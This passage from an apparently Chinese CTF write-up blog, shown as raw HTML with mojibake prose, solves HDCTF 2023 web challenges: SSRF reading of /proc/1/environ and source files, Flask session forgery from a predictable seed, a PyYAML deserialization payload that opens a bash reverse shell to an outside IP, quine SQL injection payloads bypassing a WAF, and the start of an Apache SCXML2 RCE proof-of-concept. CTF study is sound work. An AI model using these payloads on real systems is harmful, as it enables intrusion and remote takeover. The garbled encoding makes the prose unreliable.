class="line">http://node2.anna.nssctf.cn:28523/read?url=file:///../../../../../proc/1/environ</span><br></pre></td></tr></table></figure><p>è¿™é‡Œ<code>/proc/1/environ</code>çš„æ„æ€å°±æ˜¯<strong>è¿›ç¨‹ä¸º1çš„ç¯å¢ƒå˜é‡</strong></p><p><code>/proc/x/envrion</code>è¿™å°±æ˜¯æŸ¥çœ‹ä»»æ„è¿›ç¨‹çš„ç¯å¢ƒå˜é‡çš„æ–¹æ³•</p><p>æŸ¥çœ‹è¿›ç¨‹   <code>ps aux</code></p><p><strong>aï¼šæ˜¾ç¤ºå½“å‰ç»ˆç«¯ä¸‹çš„æ‰€æœ‰è¿›ç¨‹ä¿¡æ¯ï¼ŒåŒ…æ‹¬å…¶ä»–ç”¨æˆ·çš„è¿›ç¨‹ã€‚</strong></p><p><strong>uï¼šä½¿ç”¨ä»¥ç”¨æˆ·ä¸ºä¸»çš„æ ¼å¼è¾“å‡ºè¿›ç¨‹ä¿¡æ¯ã€‚</strong></p><p><strong>xï¼šæ˜¾ç¤ºå½“å‰ç”¨æˆ·åœ¨æ‰€æœ‰ç»ˆç«¯ä¸‹çš„è¿›ç¨‹ã€‚</strong></p><p><strong>é¢„æœŸè§£</strong></p><p>â€‹    </p><p><img src="../images/image-20230423151647481.png" alt="image-20230423151647481"></p><p>æŸ¥çœ‹pwdå‘ç°å½“å‰ç›®å½•æ˜¯<code>/app</code>ï¼Œäºæ˜¯å°è¯•ç”¨åˆšæ‰çš„æ–¹æ³•è¿›è¡Œ<code>/app/app.py</code>æºç çš„è¯»å–ï¼Œå› ä¸ºç›´æ¥<code>url/app.py</code>çš„è¯æ˜¯è¯»å–ä¸åˆ°çš„</p><p><img src="../images/image-20230423152137758.png" alt="image-20230423152137758"></p><p>æ­£å¸¸è¯»å–çš„æ—¶å€™å‘ç°æœ‰æ­£åˆ™è¿‡æ»¤ï¼Œäºæ˜¯æŸ¥äº†ä¸€ä¸‹</p><p><a href="https://www.cnblogs.com/xieshengsen/p/6727064.html">[æ­£åˆ™è¡¨è¾¾å¼ re.findall ç”¨æ³•]</a></p><p>é‚£ä¹ˆè¿™é‡Œçš„è¯ä¸æˆåŠŸæ˜¯å› ä¸ºï¼Œè¿™é‡ŒåŒ¹é…åˆ°urlé‡Œçš„<code>app.*</code>ï¼Œç„¶åä»¥app.*çš„æ•°ç»„å½¢å¼è¿”å›ï¼Œç„¶åå¯¼è‡´æŸ¥ä¸åˆ°ç»“æœï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨åŒé‡urlç¼–ç ç»•è¿‡</p><p><img src="../images/image-20230423152629528.png" alt="image-20230423152629528"></p><p>åŒé‡urlç»•è¿‡åæˆåŠŸè¯»å–åˆ°äº†æºç </p><p><strong>æºç </strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re, random, uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">False</span></span><br><span class="line">BLACK_LIST=[<span class="string">&quot;yaml&quot;</span>,<span class="string">&quot;YAML&quot;</span>,<span class="string">&quot;YML&quot;</span>,<span class="string">&quot;yml&quot;</span>,<span class="string">&quot;yamiyami&quot;</span>]</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>]=<span class="string">&quot;/app/uploads&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;passport&#x27;</span>] = <span class="string">&#x27;YamiYami&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Welcome to HDCTF2023 &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;br&gt;</span></span><br><span class="line"><span class="string">    Here is the challenge &lt;a href=&quot;/upload&quot;&gt;Upload file&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;br&gt;</span></span><br><span class="line"><span class="string">    Enjoy it &lt;a href=&quot;/pwd&quot;&gt;pwd&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/pwd&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwd</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(pwdpath)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        m = re.findall(<span class="string">&#x27;app.*&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;re.findall(&#x27;app.*&#x27;, url, re.IGNORECASE)&quot;</span></span><br><span class="line">        <span class="keyword">if</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;re.findall(&#x27;flag&#x27;, url, re.IGNORECASE)&quot;</span></span><br><span class="line">        res = urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(ex))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">   <span class="keyword">for</span> blackstr <span class="keyword">in</span> BLACK_LIST:</span><br><span class="line">       <span class="keyword">if</span> blackstr <span class="keyword">in</span> filename:</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">   <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">            flash(<span class="string">&#x27;No file part&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line">        file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Empty file&quot;</span></span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">            filename = secure_filename(file.filename)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;./uploads/&#x27;</span>):</span><br><span class="line">                os.makedirs(<span class="string">&#x27;./uploads/&#x27;</span>)</span><br><span class="line">            file.save(os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;upload successfully!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/boogipop&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&quot;passport&quot;</span>)==<span class="string">&quot;Welcome To HDCTF2023&quot;</span>:</span><br><span class="line">        LoadedFile=request.args.get(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(LoadedFile):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;file not exists&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(LoadedFile) <span class="keyword">as</span> f:</span><br><span class="line">            yaml.full_load(f)</span><br><span class="line">            f.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;van you see&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Auth bro&quot;</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwdpath = os.popen(<span class="string">&quot;pwd&quot;</span>).read()</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">False</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>])</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230423153527975.png" alt="image-20230423153527975"></p><p>éœ€è¦åšçš„äº‹æƒ…å°±2ä»¶ï¼Œä¼ªé€ Cookieï¼ŒYamlååºåˆ—åŒ–ï¼Œé‚£ä¹ˆCookieæ€ä¹ˆæ‹¿å‘¢ï¼Ÿkeyçš„ç§å­æ˜¯ç”±<code>uuid.getnode()</code>ç”Ÿæˆçš„ï¼Œç½‘ä¸Šæ£€ç´¢ä¸€æ³¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åœ¨ python ä¸­ä½¿ç”¨ uuid æ¨¡å—ç”Ÿæˆ UUIDï¼ˆé€šç”¨å”¯ä¸€è¯†åˆ«ç ï¼‰ã€‚å¯ä»¥ä½¿ç”¨ uuid.getnode() æ–¹æ³•æ¥è·å–è®¡ç®—æœºçš„ç¡¬ä»¶åœ°å€ï¼Œè¿™ä¸ªåœ°å€å°†ä½œä¸º UUID çš„ä¸€éƒ¨åˆ†ã€‚</span><br></pre></td></tr></table></figure><p>å› ä¸ºå®¡è®¡æºç å‘ç°ï¼Œåœ¨ä¸Šä¼ å®Œyamlååºåˆ—åŒ–çš„payloadåï¼Œè¿›å…¥boogipopçš„è¿™ä¸ªè·¯ç”±å¾—éœ€è¦<code>seesion</code>çš„å€¼ä¸º<code>Welcome To HDCTF2023</code></p><p><img src="../images/image-20230423153706421.png" alt="image-20230423153706421"></p><p>è¿™é‡Œå°±æ˜¯è€ƒæŸ¥çš„æ˜¯åˆ©ç”¨<strong>uuid</strong>æ¥è¿›è¡Œsessionä¼ªé€ </p><p>ç§å­æ˜¯é€šè¿‡<code>random.seed(uuid.getnode())</code>ç”Ÿæˆçš„ã€‚è€Œuuid.getnode()åˆæ˜¯å°†MACåœ°å€è½¬æ¢ä¸º10è¿›åˆ¶ã€‚é‚£ä¹ˆæˆ‘ä»¬é€šè¿‡ç¨‹åºä¸­çš„ä»»æ„æ–‡ä»¶è¯»å–æ¥è·å–ç½‘å¡åœ°å€ã€‚ä¸å°±èƒ½å¾—åˆ°ç§å­äº†<br>è¯»å–/proc/net/devå¯ä»¥çŸ¥é“æœåŠ¡å™¨ä¸Šçš„ç½‘å¡ã€‚æ¥ç€/sys/class/net/eth0/addresså¯ä»¥çŸ¥é“MACåœ°å€</p><p><img src="../images/image-20230423155637069.png" alt="image-20230423155637069"></p><p>ç„¶åè¿›è¡Œè¿›åˆ¶è½¬åŒ–</p><p><img src="../images/image-20230423160417630.png" alt="image-20230423160417630"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">02:42:ac:02:45:95</span><br><span class="line">2485376927125</span><br></pre></td></tr></table></figure><p>ç„¶åè·å–å¯†é’¥æ¥è¿›è¡Œsessionä¼ªé€ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.seed(<span class="built_in">int</span>(<span class="number">52234918416</span>))</span><br><span class="line">SECRET_KEY = <span class="built_in">str</span>(random.random() * <span class="number">233</span>)</span><br><span class="line"><span class="built_in">print</span>(SECRET_KEY)</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230423160653384.png" alt="image-20230423160653384"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">231.28194338656192</span><br><span class="line">2</span><br></pre></td></tr></table></figure><p>ç„¶åæ‹¿ç€å¯†é’¥å»è¿›è¡Œsessionä¼ªé€ </p><p><a href="https://github.com/noraj/flask-session-cookie-manager">sessionä¼ªé€ å·¥å…·</a></p><p><img src="../images/image-20230423161334979.png" alt="image-20230423161334979"></p><p>ç„¶åæ ¹æ®æºç è¿›è¡Œä¿®æ”¹passportä¸º<code>Welcome To HDCTF2023</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;passport&#x27;: &#x27;Welcome To HDCTF2023&#x27;&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åè¿›è¡Œç¼–ç </p><p><img src="../images/image-20230423161614597.png" alt="image-20230423161614597"></p><p>ä¼ªé€ æˆåŠŸ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJwYXNzcG9ydCI6IldlbGNvbWUgVG8gSERDVEYyMDIzIn0.ZETpRg.LJFqsGZPtbnl8N6Ngul7lMTWXgU</span><br></pre></td></tr></table></figure><p>ç„¶åå…ˆè¿›è¡Œpaylaodçš„æ–‡ä»¶ä¸Šä¼ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">!!python/<span class="built_in">object</span>/new:<span class="built_in">str</span></span><br><span class="line">    args: []</span><br><span class="line">    state: !!python/<span class="built_in">tuple</span></span><br><span class="line">      - <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/101.42.39.110/6666 &lt;&amp;1\&quot;&#x27;)&quot;</span></span><br><span class="line">      - !!python/<span class="built_in">object</span>/new:<span class="built_in">staticmethod</span></span><br><span class="line">        args: []</span><br><span class="line">        state:</span><br><span class="line">          update: !!python/name:<span class="built_in">eval</span></span><br><span class="line">          items: !!python/name:<span class="built_in">list</span></span><br></pre></td></tr></table></figure><p><a href="https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF">å…³äºyamlååºåˆ—åŒ–çš„payload</a></p><p>è¿˜æœ‰å¾ˆå¤šè¯¦ç»†çš„è§£é‡Šéƒ½åœ¨é‡Œé¢</p><p>ç„¶åå°±èƒ½æˆåŠŸå¼¹åˆ°shelläº†</p><p><strong>æ€»ç»“</strong></p><p>file://ä¼ªåè®®è¯»å–æºç </p><p>/proc/1/environ ç¯å¢ƒå˜é‡è¯»å–</p><p>æ­£åˆ™è¡¨è¾¾å¼ re.findall ç”¨æ³•  ä¸¤æ¬¡urlç¼–ç ç»•è¿‡</p><p>uuidè¿›è¡Œsessionä¼ªé€ </p><p>YAMLååºåˆ—åŒ–</p><h2 id="HDCTF-2023-LoginMaster-quineæ³¨å…¥"><a href="#HDCTF-2023-LoginMaster-quineæ³¨å…¥" class="headerlink" title="[HDCTF 2023]LoginMaster(quineæ³¨å…¥)"></a>[HDCTF 2023]LoginMaster(quineæ³¨å…¥)</h2><p>è€ƒç‚¹</p><p><img src="../images/image-20230424100905511.png" alt="image-20230424100905511"></p><p>è¿™é‡Œçš„è¯å…ˆå»äº†è§£ä¸€ä¸‹uniqueæ³¨å…¥æ˜¯å•¥ä¸œè¥¿</p><p><a href="https://nosec.org/home/detail/2395.html">è¯¦è§£Laravel 5.8 SQLæ³¨å…¥æ¼æ´(uniqueæ³¨å…¥)</a></p><p><strong>æ¼æ´è¯¦æƒ…</strong></p><p><strong>è¯¥æ¼æ´å­˜åœ¨äºLaravelçš„è¡¨å•éªŒè¯åŠŸèƒ½ï¼Œæ¼æ´å‡½æ•°ä¸ºignore()ï¼Œæ¼æ´æ–‡ä»¶ä½äº/vendor/laravel/ramework/src/Illuminate/Validation/Rules/Unique.phpã€‚æœ‰æ—¶å€™å¼€å‘è€…å¸Œæœ›åœ¨è¿›è¡Œå­—æ®µå”¯ä¸€æ€§éªŒè¯æ—¶å¿½ç•¥æŒ‡å®šå­—æ®µä»¥åŠå­—æ®µå€¼ï¼Œé€šå¸¸ä¼šè°ƒç”¨Ruleç±»çš„ignoreæ–¹æ³•ã€‚è¯¥æ–¹æ³•æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºå­—æ®µå€¼ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºå­—æ®µåï¼Œå½“å­—æ®µåä¸ºç©ºæ—¶ï¼Œé»˜è®¤å­—æ®µåä¸ºâ€œidâ€ã€‚å¦‚æœç”¨æˆ·å¯ä»¥æ§åˆ¶ignore()æ–¹æ³•çš„å‚æ•°å€¼ï¼Œå°±ä¼šäº§ç”ŸSQLæ³¨å…¥æ¼æ´ã€‚</strong></p><p>è¿™é‡Œçš„è¯å°±æ‰«ä¸€ä¸‹ç›®å½•å‘ç°å­˜åœ¨robots.txtæ–‡ä»¶ï¼Œç„¶åè¿›è¡Œè¯»å–ï¼Œå‘ç°å­˜åœ¨wafæ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSql</span>(<span class="params"><span class="variable">$s</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;</span>,<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;hacker&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;wrong password&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br></pre></td></tr></table></figure><p>ç„¶åæŠŠè¿™æ®µä»£ç åˆ°googleä¸€æœç´¢ï¼Œå°±èƒ½æ‰¾åˆ°åŸé¢˜äº†(<strong>æ‰“äº†è¿™ä¹ˆå¤šæ¯”èµ› ï¼Œç­‰èµ›åçœ‹wpå¤ç°çš„æ—¶å€™æ‰å‘ç°åŸåŸæ¥å¥½å¤šä¸œè¥¿éƒ½æ˜¯å¯ä»¥æœå‡ºæ¥ï¼Œåªæ˜¯è‡ªå·±æœçš„ä¸è¿‡å‡†ç¡®</strong>)</p><p><strong>æœç„¶ æœç´¢ä¹Ÿæ˜¯ä¸€é—¨å­¦é—®</strong></p><p><a href="https://www.cnblogs.com/zhengna/p/15917521.html">CTFHub_2021-ç¬¬äº”ç©ºé—´æ™ºèƒ½å®‰å…¨å¤§èµ›-Web-yet_another_mysql_injectionï¼ˆquineæ³¨å…¥ï¼‰</a></p><p>è¿™å°±æ˜¯åŸé¢˜çš„é¢˜ç›®ï¼Œè¿™é“é¢˜å°±å±äºæ˜¯ç…§æ¬ä¸‹æ¥çš„</p><p><strong>payload1</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;/**/union/**/select/**/replace(replace(&#x27;</span><span class="number">1</span>&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;,char(34),char(39)),char(46),&#x27;1&quot;<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>replace(replace(&quot;.&quot;,<span class="type">char</span>(<span class="number">34</span>),<span class="type">char</span>(<span class="number">39</span>)),<span class="type">char</span>(<span class="number">46</span>),&quot;.&quot;)#<span class="string">&#x27;)#</span></span><br></pre></td></tr></table></figure><p><strong>payload2</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;UNION(SELECT(REPLACE(REPLACE(&#x27;</span><span class="number">1</span>&quot;UNION(SELECT(REPLACE(REPLACE(&quot;<span class="operator">%</span>&quot;,CHAR(34),CHAR(39)),CHAR(37),&quot;<span class="operator">%</span>&quot;)))#&#x27;,CHAR(34),CHAR(39)),CHAR(37),&#x27;1&quot;<span class="keyword">UNION</span>(<span class="keyword">SELECT</span>(REPLACE(REPLACE(&quot;%&quot;,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>)),<span class="type">CHAR</span>(<span class="number">37</span>),&quot;%&quot;)))#<span class="string">&#x27;)))#</span></span><br></pre></td></tr></table></figure><p>å…¶å®å°±æ˜¯çœ‹è°åšè¿‡è¿™é¢˜æˆ–åˆ™æ˜¯è®°å¾—æ‹¿ç€é¢˜ç›®ç»™çš„wafå»æœï¼Œç„¶åå‘ç°åŸé¢˜</p><p>ç„¶åå°±ç›´æ¥æ‹¿ç€åŸé¢˜ç»™çš„wpç›´æ¥æ‰“å°±è¡Œäº†</p><h2 id="BabyJXvX"><a href="#BabyJXvX" class="headerlink" title="BabyJXvX"></a>BabyJXvX</h2><p><strong>è€ƒç‚¹</strong>     <strong>Apache SCXML2 RCE</strong></p><p><a href="https://www.yuque.com/boogipop/okvgcs/zzx3n35xsg26ss0e?view=doc_embed">Apache SCXML2 RCEåˆ†æ</a></p><p>è¿™é‡Œæˆ‘ä»¬è‡ªå·±æ¥è·Ÿä¸€éè¿™ä¸ªé€»è¾‘ï¼Œæ¥å­¦ä¹ ä¸€ä¸‹</p><p>è¿™é‡ŒçœŸçš„æœäº†ï¼Œæ²¡æœ‰æ–‡ç« æ¥è¿›è¡Œå­¦ä¹ å’‹æ ·å®‰è£…ç¯å¢ƒï¼Œç›´æ¥å»mavenæ‰¾çš„è¯æ˜¯æ‰¾ä¸åˆ°çš„ï¼Œåªèƒ½é€šè¿‡æŠ¥é”™ä¿¡æ¯ä¸€ä¸ªä¸€ä¸ªjaråŒ…ä¸‹è½½ä¸‹æ¥</p><p><strong>è¿™é‡Œæˆ‘ç”¨çš„jdkæ˜¯8</strong>   </p><p><img src="../images/image-20230425142328815.png" alt="image-20230425142328815"></p><p><img src="../images/image-20230425142335239.png" alt="image-20230425142335239"></p><p>å°±æ˜¯å¾—è‡ªå·±ç™¾åº¦å…ˆä¸‹è½½ä¸¤ä¸ªjaråŒ…ï¼Œç„¶åmavenä¸‹è½½ä¸€ä¸ªæ–°çš„jaråŒ…</p><p>ç„¶ååœ¨å­˜åœ¨xmlæ–‡ä»¶çš„ç›®å½•å¼€å¯ä¸€ä¸ªpythonæœåŠ¡å°±å¯ä»¥å¼€å§‹åˆ†æè¿™ä¸ªæ¼æ´äº†</p><p><img src="../images/image-20230425142503857.png" alt="image-20230425142503857"></p><p><strong>demo</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.SCXMLExecutor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.io.SCXMLReader;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.model.ModelException;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.model.SCXML;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.stream.XMLStreamException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ModelException, XMLStreamException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// engine to execute the scxml instance</span></span><br><span class="line">        <span class="type">SCXMLExecutor</span> <span class="variable">executor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SCXMLExecutor</span>();</span><br><span class="line">        <span class="comment">// parse SCXML URL into SCXML model</span></span><br><span class="line">        <span class="type">SCXML</span> <span class="variable">scxml</span> <span class="operator">=</span> SCXMLReader.read(<span class="string">&quot;http://127.0.0.1:8000/1.xml&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// set state machine (scxml instance) to execute</span></span><br><span class="line">        executor.setStateMachine(scxml);</span><br><span class="line">        executor.go();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>xmlæ–‡ä»¶</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span 